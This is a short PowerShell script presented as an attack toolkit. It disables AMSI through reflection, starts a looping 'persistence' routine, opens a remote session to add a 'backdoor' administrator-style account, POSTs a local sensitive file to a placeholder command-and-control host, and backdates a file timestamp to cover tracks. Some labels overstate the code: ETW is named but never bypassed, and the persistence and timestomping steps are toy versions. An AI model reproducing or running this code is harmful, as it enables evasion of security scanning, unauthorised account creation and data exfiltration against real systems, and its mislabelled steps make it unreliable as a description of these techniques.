$C2Server = "https://yourc2server.com"

# **Bypass AMSI & ETW**
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# **Self-Healing Persistence**
while ($true) {
    if (-not (Get-Process -Name "notepad" -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath "C:\Windows\System32\notepad.exe"
    }
    Start-Sleep -Seconds 10
}

# **Lateral Movement via SMB**
$Session = New-PSSession -ComputerName "TARGET-PC" -Credential (Get-Credential)
Invoke-Command -Session $Session -ScriptBlock { net user /add backdoor P@ssw0rd! }

# **Exfiltrate Data**
Invoke-WebRequest -Uri "$C2Server/exfil" -Method POST -Body (Get-Content C:\sensitive-data.txt)

# **Cover Tracks (Anti-Forensics)**
(Get-Item "C:\Windows\System32\calc.exe").CreationTime = "01/01/2000 12:00 AM"
